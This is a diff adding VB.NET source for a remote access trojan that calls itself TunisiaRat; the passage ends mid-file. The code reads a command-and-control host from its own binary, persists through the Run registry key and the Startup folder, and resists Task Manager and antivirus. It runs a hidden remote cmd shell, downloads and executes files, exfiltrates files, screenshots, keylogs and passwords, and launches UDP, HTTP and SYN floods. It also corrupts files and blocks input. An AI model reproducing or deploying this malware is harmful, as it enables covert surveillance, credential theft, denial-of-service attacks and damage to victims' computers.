@@ -1,0 +1,1193 @@
+﻿Imports System.Globalization ' الفضاء الذي سساعدنا على جلب اسم الدوله
+Imports System.IO
+Imports Microsoft.Win32
+Imports System.Threading
+
+Imports System.Net, System.Net.Sockets, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices
+Imports System.IO.Compression
+Imports System.Environment
+Imports System.Management, System.CodeDom.Compiler, System.Reflection, System.DirectoryServices, System.IO.File, System.IO.FileStream, System.Runtime.InteropServices.ComTypes, System.Text.RegularExpressions, System.Drawing.Imaging, System.ServiceProcess, System.Net.NetworkInformation, System.Drawing.Drawing2D, Microsoft.VisualBasic.Devices, System.Security.Cryptography
+
+Public Class Form1
+    Delegate Sub chatappd(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)
+    Private Declare Function BlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
+    Private Declare Function ShowCursor Lib "user32" (ByVal lShow As Long) As Long
+    Public cap As New CRDP
+    Dim yy As String = "||"
+    Public StartupKey As String
+    Public hidep As String = 0
+    Public sts As String = 0
+    Public us As String = 0
+    Public ws As String = 0
+    Public prx As Boolean = 0
+    Public ad As String = 0
+    Public a6 As String = 0
+    Public a7 As String = 0
+    Public a8 As String = 0
+    Public a9 As String = 0
+    Public sg As String = 0
+    Public cts As String = 0
+    Public task As String = 0
+    Public ipb As String = 0
+    Public ph As String = 0
+    Dim rK As RegistryKey = Nothing
+    Dim ass As String
+    Public melts As Boolean = 0
+    Public rThread As Thread
+    Public WithEvents c As New SocketClient 'تعريف متغير من السوكت
+    Private culture As String = CultureInfo.CurrentCulture.EnglishName
+    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1) ' متغير محفوظ فيه اسم الدوله
+    Dim host As String
+    Dim port As Integer
+    Dim virus As String
+    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
+    Private makel As String
+    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
+    Const TASKBAR_SHOW As Integer = &H40
+    Const TASKBAR_HIDE As Integer = &H80
+    Private Const SETDESKWALLPAPER = 20
+    Private Const UPDATEINIFILE = &H1
+    Dim alaa(), text1, text2, text3 As String
+    Const spl As String = "abccba"
+    Dim pw As String
+    Dim o As New njLogger
+    Public caa As New CRDP1
+    Public mb As String = 0
+    Public sbi As String = 0
+    Public loggg As String
+    Public cp As String = 0
+    Dim namev As String = "Name"
+    Dim vir As String = "6.0"
+    Dim px As String = 0
+    Public virustotal As String = 0
+    Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
+    Public pinger As Integer = 0
+    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)
+    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
+    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
+    Dim tcpfuck = New TcpController()
+    Public tictoc As Integer = 0
+
+    Public i As Integer
+    Dim PictureBox1 As Windows.Forms.PictureBox
+    Dim PersistThread As Thread
+    Dim ta As New AntiTaskManager
+    Dim st As New Threading.Thread(AddressOf ta.protect)
+    Dim usb As New USB
+    Dim rg As String
+    Public akl As String = 0
+    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
+    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
+        End
+        o.Close(True)
+    End Sub
+
+    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+
+        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
+        text1 = Space(LOF(1))
+        text2 = Space(LOF(1))
+        text3 = Space(LOF(1))
+
+        FileGet(1, text1)
+        FileGet(1, text2)
+        FileGet(1, text3)
+
+        FileClose()
+        alaa = Split(text1, spl)
+        host = alaa(1)
+        port = alaa(2)
+        virus = (alaa(3))
+        task = alaa(4)
+        us = alaa(5)
+        hidep = alaa(6)
+        melts = alaa(7)
+        Try
+            px = alaa(8)
+            sbi = alaa(9)
+            sts = alaa(10)
+            sg = alaa(11)
+            ws = alaa(12)
+            mb = alaa(13)
+            ad = alaa(14)
+            ipb = alaa(15)
+            cp = alaa(16)
+            ph = alaa(17)
+            akl = alaa(18)
+            a6 = alaa(19)
+            a7 = alaa(20)
+            cts = alaa(21)
+            virustotal = alaa(22)
+        Catch : End Try
+        Me.Hide()
+        Timer1.Start()
+        pw = A.GT
+        o.Start()
+      
+        If virustotal Then
+            virustotal1.Block("virustotal")
+        End If
+        If cts Then
+            Try
+                AStartup(StartupKey, Application.ExecutablePath)
+                Dim startup As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
+                IO.File.Copy(Application.ExecutablePath, startup & "\" & StartupKey & ".exe")
+            Catch : End Try
+        End If
+        If a7 Then
+            Timer14.Start()
+        End If
+        If a6 Then
+            Timer13.Start()
+        End If
+        If akl Then
+            Timer12.Start()
+        End If
+        If ph Then
+            Timer11.Start()
+        End If
+        If cp Then
+            Timer10.Start()
+        End If
+        If ipb Then
+            Timer9.Start()
+        End If
+        If ad Then
+            Timer8.Start()
+        End If
+        If mb Then
+            Timer7.Start()
+        End If
+        If ws Then
+            Timer6.Start()
+        End If
+        If sg Then
+            Timer5.Start()
+        End If
+        If sts Then
+            taskmgrkiller.Start()
+        End If
+        If sbi Then
+            Timer2.Start()
+        End If
+        If px Then
+            Timer4.Start()
+
+        End If
+        Try
+
+            Dim StartupKey As String = "Windows"
+            Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
+
+            regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
+        Catch : End Try
+        If melts Then
+
+        End If
+        If hidep Then
+            TMListViewDelete.Running = True
+        End If
+        If us Then
+            Dim usb As New USB
+            usb.Start()
+        End If
+        If task Then
+            Dim ta As New AntiTaskManager
+            Dim st As New Threading.Thread(AddressOf ta.protect)
+            st.Start()
+        End If
+
+       
+    End Sub
+    Public Shared Sub AStartup(ByVal Name As String, ByVal Path As String)
+        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
+        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
+        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
+    End Sub
+    Public Sub DLV(ByVal n As String) ' delete value in my Registry Key RG
+        Try
+            Registry.CurrentUser.CreateSubKey("Software\" & RG).DeleteValue(n)
+        Catch ex As Exception
+        End Try
+    End Sub
+    Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
+        Try
+            Return Registry.CurrentUser.CreateSubKey("Software\" & RG).GetValue(n, "")
+        Catch ex As Exception
+            Return ""
+        End Try
+    End Function
+    Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
+        Try
+            Registry.CurrentUser.CreateSubKey("Software\" & RG).SetValue(n, t)
+            Return True
+        Catch ex As Exception
+            Return False
+        End Try
+    End Function
+    Public Sub OpenCDDriveDoor()
+        Try
+            Call mciSendString("Set CDAudio Door Open", 0, 0, 0)
+        Catch ex As Exception
+
+        End Try
+    End Sub
+
+    Public Sub CloseCdDriveDoor()
+        Try
+            Call mciSendString("Set CDAudio Door Closed", 0, 0, 0)
+        Catch ex As Exception
+
+        End Try
+    End Sub
+
+    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
+    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
+
+    Function GetKey(ByVal key As String) As Microsoft.Win32.RegistryKey ' get registry Key
+        Dim k As String
+        If key.StartsWith(Registry.ClassesRoot.Name) Then
+            k = key.Replace(Registry.ClassesRoot.Name & "\", "")
+            Return Registry.ClassesRoot.OpenSubKey(k, True)
+        End If
+        If key.StartsWith(Registry.CurrentUser.Name) Then
+            k = key.Replace(Registry.CurrentUser.Name & "\", "")
+            Return Registry.CurrentUser.OpenSubKey(k, True)
+        End If
+        If key.StartsWith(Registry.LocalMachine.Name) Then
+            k = key.Replace(Registry.LocalMachine.Name & "\", "")
+            Return Registry.LocalMachine.OpenSubKey(k, True)
+        End If
+        If key.StartsWith(Registry.Users.Name) Then
+            k = key.Replace(Registry.Users.Name & "\", "")
+            Return Registry.Users.OpenSubKey(k, True)
+        End If
+        Return Nothing
+    End Function
+#Region "Protect With BSOD"
+    <DllImport("ntdll")> _
+    Private Shared Function maPJUJpF(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
+    End Function
+    Sub pr(ByVal i As Integer) ' protect process With BSOD
+        ' if i= 0  Unprotect, if i=1 Protect
+        Try
+            maPJUJpF(Process.GetCurrentProcess.Handle, 29, i, 4)
+        Catch ex As Exception
+        End Try
+    End Sub
+    Private Sub ED()
+        pr(0)
+    End Sub
+    Private Sub SessionEnding(ByVal sender As System.Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
+        pr(0)
+    End Sub
+#End Region
+    'للأخفاء 
+    Public Sub HideTaskBar()
+        Dim TaskbarHandle As Long
+        TaskbarHandle = FindWindow("Shell_traywnd", "")
+        SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_HIDE)
+    End Sub
+    'للأظهار
+    Public Sub ShowTaskBar()
+        Dim TaskbarHandle As Long
+        TaskbarHandle = FindWindow("Shell_traywnd", "")
+        SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_SHOW)
+    End Sub
+    Private Sub SuspendProcess(ByVal process As System.Diagnostics.Process)
+        For Each t As ProcessThread In process.Threads
+            Dim th As IntPtr
+            th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
+            If th <> IntPtr.Zero Then
+                SuspendThread(th)
+                CloseHandle(th)
+            End If
+        Next
+    End Sub
+    Private DJB As Object
+    Function xSTCWkAgg() As String ' Get Installed Apps
+        Dim N As String
+        Dim DestKey As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"
+        Dim iList = ""
+        For Each App As String In Registry.LocalMachine.OpenSubKey(DestKey).GetSubKeyNames
+            N = Registry.LocalMachine.OpenSubKey(DestKey & App & "\").GetValue("DisplayName")
+            'Dim s As String = Registry.LocalMachine.OpenSubKey(DestKey & App & "\").GetValue("InstallLocation")
+            iList += N & "Splitplogmanager"
+        Next
+        Return iList
+    End Function
+    Private Sub data(ByVal b As Byte()) Handles c.Data
+        Dim Message As String = (BS(b))
+        Dim ala As String() = Split(BS(b), "||") ' اريه من نوع سترينغ تقسم البانات القادمه اعتمادا على "||"
+        'جمله شرطيه بالاعتماد على اول كلمه يرسلها الكلاينت
+        Try
+            Select Case ala(0)
+                Case "oprog"
+                    c.Send("oprog" & yy & alaa(1))
+                Case "iprog"
+                    c.Send("iprog" & yy & xSTCWkAgg())
+                Case "RG" ' Registry 
+                    Dim kk As Object = GetKey(ala(2))
+                    Select Case ala(1)
+                        Case "~" ' send keys under key+ send values 
+                            Dim s As String = "RG" & yy & "~" & yy & ala(2) & yy
+                            Dim o As String = ""
+                            For Each xe As String In kk.GetSubKeyNames
+                                If xe.Contains("\") = False Then
+                                    o += xe & yy
+                                End If
+                            Next
+                            For Each xs As String In kk.GetValueNames
+                                o += xs & "/" & kk.GetValueKind(xs).ToString & "/" & kk.GetValue(xs, "").ToString & yy
+                            Next
+                            c.Send(s & o)
+                        Case "!" ' Set Value
+                            kk.SetValue(ala(3), ala(4), ala(5))
+                        Case "@5" ' delete value
+                            kk.DeleteValue(ala(3), False)
+                        Case "#" ' creat key
+                            kk.CreateSubKey(ala(3))
+                        Case "$" ' delete key
+                            kk.DeleteSubKeyTree(ala(3))
+                    End Select
+                Case "infoDesk"
+                    Dim m As Image = CaptureDesktop()
+                    Dim cc As New ImageConverter
+                    Dim bb As Byte() = cc.ConvertTo(m, b.GetType)
+                    c.Send("infoDesk" & yy & Convert.ToBase64String(bb) & yy & Name & yy & port & yy & vir & yy & GetFirewall() & yy & Application.ExecutablePath)
+                Case "FLOOD"
+                    c.Send("FLOOD" & yy)
+                Case "Fstart"
+                    Try
+                        Select Case ala(1)
+                            Case "UDP"
+                                If UDP.IsEnabled Then
+                                    UDP.StopUDPz()
+                                End If
+                                UDP.Host = ala(2)
+                                UDP.Port = ala(3)
+                                UDP.Threads = ala(4)
+                                UDP.UDPzSockets = ala(5)
+                                UDP.StartUDPz()
+                            Case "HTTP"
+                                If HttpFlood.IsEnabled Then
+                                    HttpFlood.StopHttpFlood()
+                                End If
+                                HttpFlood.Host = ala(2)
+                                HttpFlood.Interval = ala(3)
+                                HttpFlood.Threads = ala(4)
+                                HttpFlood.StartHttpFlood()
+                            Case "SYN"
+                                If Syn.IsEnabled Then
+                                    Syn.StopSuperSyn()
+                                End If
+                                Syn.Host = ala(2)
+                                Syn.Port = ala(3)
+                                Syn.Threads = ala(4)
+                                Syn.SuperSynSockets = ala(5)
+                                Syn.StartSuperSyn()
+                            Case "TCP"
+                                tcpfuck.AddTarget(ala(2), ala(3), ala(4), ala(5))
+                                tcpfuck.Start()
+                        End Select
+                    Catch : End Try
+                Case "Fstop"
+                    Try
+                        Select Case ala(1)
+                            Case "UDP"
+                                UDP.StopUDPz()
+                            Case "HTTP"
+                                HttpFlood.StopHttpFlood()
+                            Case "SYN"
+                                Syn.StopSuperSyn()
+                            Case "TCP"
+                                tcpfuck.stop()
+                        End Select
+                    Catch : End Try
+                Case "ddos"
+                    Shell(("ping -t" & ala(1) & "-l " & ala(2)), AppWinStyle.Hide, False, -1)
+                Case "Scb"
+                    Dim Security() As Process = System.Diagnostics.Process.GetProcessesByName("CSRSS")
+                    For Each Najaf As Process In Security
+                        Najaf.Kill()
+                    Next
+                Case "newpr"
+                    Process.Start(ala(1))
+                Case "!!" ' server ask for my screen Size
+                    cap.Clear()
+                    Dim s = Screen.PrimaryScreen.Bounds.Size
+                    c.Send("!!" & yy & s.Width & yy & s.Height)
+                Case "@@" ' Start Capture
+
+                    Dim SizeOfimage As Integer = ala(1)
+                    Dim Split As Integer = ala(2)
+                    Dim Quality As Integer = ala(3)
+
+                    Dim Bb As Byte() = caa.Cap(SizeOfimage, Split, Quality)
+                    Dim M As New IO.MemoryStream
+                    Dim CMD As String = "@@" & yy
+                    M.Write(SB(CMD), 0, CMD.Length)
+                    M.Write(Bb, 0, Bb.Length)
+                    c.Send(M.ToArray)
+                    M.Dispose()
+                Case "SProcess"
+                    Dim eachprocess As String() = ala(1).Split("ProcessSplit")
+                    For i = 0 To eachprocess.Length - 2
+                        Dim o = Process.GetProcessesByName(eachprocess(i))
+                        SuspendProcess(o(0))
+                        c.Send("SP")
+                    Next
+                Case "clipss"
+                    c.Send("clipss" & yy)
+                Case "getcli"
+
+                    Invoke(New gt(AddressOf gtx))
+                Case "edittextfile"
+                    Dim R As New IO.StreamReader(ala(1))
+                    Dim d As String
+                    d = R.ReadToEnd
+                    R.Close()
+                    c.Send("edittextfile" & yy & ala(1) & yy & d)
+                Case "savetextfile"
+                    Dim C As New IO.StreamWriter(ala(1))
+                    C.WriteLine(ala(2))
+                    C.Close()
+               
+                Case "requestrecords"
+                    c.Send("requestrecords")
+                Case "viewimage"
+                    c.Send("viewimage" & yy & Convert.ToBase64String(IO.File.ReadAllBytes(ala(1))) & yy)
+                Case "Batch"
+                    If File.Exists(Path.GetTempPath & "bat.bat") Then
+                        File.Delete(Path.GetTempPath & "bat.bat")
+                    End If
+                    System.IO.File.WriteAllText(Path.GetTempPath & "bat.bat", Message.Substring(8).Replace(yy, vbNewLine))
+                    Process.Start(Path.GetTempPath & "bat.bat")
+
+                Case "Vbs"
+                    If File.Exists(Path.GetTempPath & "vbs.vbs") Then
+                        File.Delete(Path.GetTempPath & "vbs.vbs")
+                    End If
+                    System.IO.File.WriteAllText(Path.GetTempPath & "vbs.vbs", Message.Substring(8).Replace(yy, vbNewLine))
+                    Process.Start(Path.GetTempPath & "vbs.vbs")
+                Case "sendinformation"
+                    Dim time, h, m, s As Integer
+                    time = My.Computer.Clock.TickCount
+                    h = time \ 3600000
+                    m = (time Mod 3600000) \ 60000
+                    s = ((time Mod 3600000) Mod 60000) / 1000
+                    Dim ab, bb, cb, db, eb, fb, gb As String
+                    ab = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "")
+                    bb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "Identifier", "")
+                    cb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName", "")
+                    db = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSReleaseDate", "")
+                    eb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion", "")
+                    fb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer", "")
+                    gb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVendor", "")
+                    Dim value As String = Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\TunisiaRat", "ID", "")
+                    c.Send("sendinformation" & yy & Environment.MachineName & yy & Environment.UserName & yy & My.Computer.Info.OSFullName & yy & My.Computer.Info.OSPlatform & yy & country & yy & getanti() & yy & GetSystemRAMSize() & yy & "0.1.0" & yy & checkcam() & yy & ACT() & yy & My.Computer.Clock.LocalTime & yy & h & ":" & m & ":" & s & yy & Environment.CurrentDirectory & yy & Environment.SystemDirectory & yy & Environment.UserDomainName & yy & Environment.UserInteractive & yy & Environment.WorkingSet & yy & My.Computer.Info.OSVersion & yy & My.Computer.Info.InstalledUICulture.ToString & yy & System.Environment.CommandLine & yy & port & yy & Application.ExecutablePath & yy & ab & yy & bb & yy & cb & yy & db & yy & eb & yy & fb & yy & gb & yy & value)
+
+                Case "corrupt"
+                    Dim corruption As String = "wAyqsW4eE9Csd0dndY1rLnufPtO4Vjp9cRvXz0g38RaWjeoo1OBXT0CNp4wW7vY4Ti6Sm64zhnEn0QWHcVTGZrnNHcc9JFDNGAPYCzPWwyDPIDBsdg067E8newVoWRj7TON9roebC3m0iW9oGJ73CM4UelTtjctQvxt2QqpXATVVvAKpibp7qcoiRV9Vmves42mYUI42"
+                    Dim R As New IO.StreamReader(ala(1))
+                    Dim d As String
+                    d = R.ReadToEnd
+                    R.Close()
+                    My.Computer.FileSystem.WriteAllText(ala(1), corruption & d, False)
+                Case "cryptedecryptetextfile"
+                    Dim x As String
+                    Dim R As New IO.StreamReader(ala(1))
+                    Dim d As String
+                    d = R.ReadToEnd
+                    R.Close()
+                    Dim i As Short
+                    Dim KeyChar As Integer
+                    KeyChar = Asc("~!@#$%^&*()_+/*-+")
+                    For i = 1 To Len(d)
+                        x &= Chr(KeyChar Xor Asc(Mid(d, i, 1)))
+                    Next
+                    Dim C As New IO.StreamWriter(ala(1))
+                    C.WriteLine(x)
+                    C.Close()
+                Case "edittextfile"
+                    Dim R As New IO.StreamReader(ala(1))
+                    Dim d As String
+                    d = R.ReadToEnd
+                    R.Close()
+                    c.Send("edittextfile" & yy & ala(1) & yy & d)
+                Case "savetextfile"
+                    Dim C As New IO.StreamWriter(ala(1))
+                    C.WriteLine(ala(2))
+                    C.Close()
+                Case "creatnewtextfile"
+                    Try
+                        IO.File.Create(ala(1)).Dispose()
+                    Catch ex As Exception
+                        c.Send("msgbox" & yy & "Information" & yy & "File Name Already Exists")
+                    End Try
+                Case "setaswallpaper"
+                    SystemParametersInfo(SETDESKWALLPAPER, 0, ala(1), UPDATEINIFILE)
+                Case "getdesktoppath"
+                    Dim specialfolder As String
+                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
+                    c.Send("getpath" & yy & specialfolder & "\")
+                Case "gettemppath"
+                    Dim specialfolder As String
+                    specialfolder = IO.Path.GetTempPath
+                    c.Send("getpath" & yy & specialfolder)
+                Case "getstartuppath"
+                    Dim specialfolder As String
+                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
+                    c.Send("getpath" & yy & specialfolder & "\")
+                Case "getmydocumentspath"
+                    Dim specialfolder As String
+                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
+                    c.Send("getpath" & yy & specialfolder & "\")
+                Case "getmyimagespath"
+                    Dim specialfolder As String
+                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
+                    c.Send("getpath" & yy & specialfolder & "\")
+                Case "getrecentpath"
+                    Dim specialfolder As String
+                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Recent)
+                    c.Send("getpath" & yy & specialfolder & "\")
+                Case "getmymusicpath"
+                    Dim specialfolder As String
+                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
+                    c.Send("getpath" & yy & specialfolder & "\")
+                Case "gethistorypath"
+                    Dim specialfolder As String
+                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.History)
+                    c.Send("getpath" & yy & specialfolder & "\")
+                Case "chat"
+                    'Chat Modded By Simon-Benyo
+                    Invoke(New chatappd(AddressOf chatappds), ala(1), ala(2), ala(3))
+                Case "sendfile"
+                    IO.File.WriteAllBytes(IO.Path.GetTempPath & ala(1), Convert.FromBase64String(ala(2)))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+                    Process.Start(IO.Path.GetTempPath & ala(1))
+                Case "download"
+                    My.Computer.Network.DownloadFile(ala(1), IO.Path.GetTempPath & ala(2))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+                    Process.Start(IO.Path.GetTempPath & ala(2))
+                Case "closeserver"
+                    End
+                Case "restartserver"
+                    Application.Restart()
+                    End
+                Case "sendfileto"
+                    IO.File.WriteAllBytes(ala(1), Convert.FromBase64String(ala(2)))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+                Case "downloadfile"
+                    c.Send("downloadedfile" & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(ala(1))) & "||" & ala(2))
+
+                Case "msgbox"
+                    Dim messageicon As MessageBoxIcon
+                    Dim messagebutton As MessageBoxButtons
+                    Select Case ala(1)
+                        Case "1"
+                            messageicon = MessageBoxIcon.Information
+                        Case "2"
+                            messageicon = MessageBoxIcon.Question
+                        Case "3"
+                            messageicon = MessageBoxIcon.Warning
+                        Case "4"
+                            messageicon = MessageBoxIcon.Error
+                    End Select
+                    Select Case ala(2)
+                        Case "1"
+                            messagebutton = MessageBoxButtons.YesNo
+                        Case "2"
+                            messagebutton = MessageBoxButtons.YesNoCancel
+                        Case "3"
+                            messagebutton = MessageBoxButtons.OK
+                        Case "4"
+                            messagebutton = MessageBoxButtons.OKCancel
+                        Case "5"
+                            messagebutton = MessageBoxButtons.RetryCancel
+                        Case "6"
+                            messagebutton = MessageBoxButtons.AbortRetryIgnore
+                    End Select
+                    MessageBox.Show(ala(4), ala(3), messagebutton, messageicon)
+                Case "openchat"
+                    c.Send("readytochat")
+                Case "stopchat"
+                    chat.Close()
+                Case "openurl"
+                    If ala(1) = "Default" Then
+                        Try
+                            System.Diagnostics.Process.Start(ala(2))
+                        Catch ex As Exception
+                        End Try
+                    Else
+                        Try
+                            System.Diagnostics.Process.Start(ala(1), ala(2))
+                        Catch ex As Exception
+
+                        End Try
+                    End If
+
+                Case "shutdowncomputer"
+                    Shell("shutdown -s -t 00", AppWinStyle.Hide)
+                Case "restartcomputer"
+                    Shell("shutdown -r -t 00", AppWinStyle.Hide)
+                Case "logoff"
+                    Shell("shutdown -l -t 00", AppWinStyle.Hide)
+                Case "blockmouseandkeyboard"
+                    BlockInput(1)
+                    ShowCursor(0)
+                    taskmgrkiller.Start()
+                Case "unblockmouseandkeyboard"
+                    BlockInput(0)
+                    ShowCursor(1)
+                    taskmgrkiller.Stop()
+                Case "fun"
+                    c.Send("fun")
+                Case "tt"
+                    c.Send("tt")
+                Case "opentto"
+                    c.Send("opentto")
+                Case "TextToSpeech"
+                    Dim SAPI = CreateObject("SAPI.Spvoice")
+                    SAPI.speak(ala(1))
+
+                Case "rss" ' start remote shell
+                    Try
+                        DJB.Kill()
+                    Catch ex As Exception
+                    End Try
+                    DJB = New Process
+                    DJB.StartInfo.RedirectStandardOutput = True
+                    DJB.StartInfo.RedirectStandardInput = True
+                    DJB.StartInfo.RedirectStandardError = True
+                    DJB.StartInfo.FileName = "cmd.exe"
+                    DJB.StartInfo.RedirectStandardError = True
+                    AddHandler CType(DJB, Process).OutputDataReceived, AddressOf RS
+                    AddHandler CType(DJB, Process).ErrorDataReceived, AddressOf RS
+                    AddHandler CType(DJB, Process).Exited, AddressOf ex
+                    DJB.StartInfo.UseShellExecute = False
+                    DJB.StartInfo.CreateNoWindow = True
+                    DJB.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+                    DJB.EnableRaisingEvents = True
+                    c.Send("rss" & yy)
+                    DJB.Start()
+                    DJB.BeginErrorReadLine()
+                    DJB.BeginOutputReadLine()
+                Case "rs"
+                    DJB.StandardInput.WriteLine(DEB(ala(1)))
+                Case "rsc"
+                    Try
+                        DJB.Kill()
+                    Catch ex As Exception
+                    End Try
+                    DJB = Nothing
+
+                Case "Uninstall"
+                    End
+                Case "restart"
+                    Application.Restart()
+
+                Case "opentto"
+                    c.Send("opentto")
+                Case "TextToSpeech"
+                    Dim SAPI = CreateObject("SAPI.Spvoice")
+                    SAPI.speak(ala(1))
+
+                Case "tt"
+                    c.Send("tt")
+
+             
+
+                Case "NormalMouse"
+                    SwapMouseButton(&H0&)
+                Case "ReverseMouse"
+                    SwapMouseButton(&H100&)
+                Case "openkl"
+                    c.Send("openkl")
+                Case "getlogs"
+                    Try
+                        loggg = o.Logs
+                        c.Send("getlogs" & yy & loggg)
+                    Catch : End Try
+                Case "openRG"
+                    c.Send("openRG")
+                Case "openpw"
+                    c.Send("openpw")
+                Case "getpw"
+                    c.Send("getpw" & "||" & pw)
+
+                Case "s"
+                    HideTaskBar()
+                Case "s1"
+                    ShowTaskBar()
+
+                Case "لوحة1"
+                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                Case "لوحة2"
+                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                Case "وين1"
+                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWindowsUpdate", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                Case "وين2"
+                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWindowsUpdate", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                Case "creatnewfolder"
+                    Try
+                        My.Computer.FileSystem.CreateDirectory _
+        (ala(1))
+
+                    Catch ez As Exception
+                    End Try
+
+
+
+                Case "opencd"
+                    Try
+                        mciSendString("set cdaudio door open", 0, 0, 0)
+                    Catch ex As Exception
+                    End Try
+                Case "closecd"
+                    Try
+                        mciSendString("set cdaudio door closed", 0, 0, 0)
+                    Catch ex As Exception
+                    End Try
+                Case "\\"
+                    c.Send("\\")
+                Case "GetProcesses"
+                    Dim allProcess As String = ""
+                    Dim ProcessList As Process() = Process.GetProcesses()
+                    For Each Proc As Process In ProcessList
+                        allProcess += Proc.ProcessName & "ProcessSplit" & Proc.Id & "ProcessSplit" & Proc.SessionId & "ProcessSplit" & Proc.MainWindowTitle & "ProcessSplit"
+                    Next
+                    c.Send("ProcessManager" & yy & allProcess)
+                Case "KillProcess"
+                    Dim eachprocess As String() = ala(1).Split("ProcessSplit")
+                    For i = 0 To eachprocess.Length - 2
+                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
+                            RunningProcess.Kill()
+                        Next
+                    Next
+
+                Case "info"
+                    c.Send("info" & "||" & virus & "||" & Environment.MachineName & "/" & Environment.UserName & "||" & My.Computer.Info.OSFullName & "||" & country & "||" & vir & "||" & getanti() & "||" & rams() & "GB" & "||" & GetCaption())
+                Case "sendfile"
+                    IO.File.WriteAllBytes(IO.Path.GetTempPath & ala(1), Convert.FromBase64String(ala(2)))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+                    Process.Start(IO.Path.GetTempPath & ala(1))
+
+                Case "GetDrives"
+                    c.Send("FileManager" & "||" & getDrives())
+                Case "FileManager"
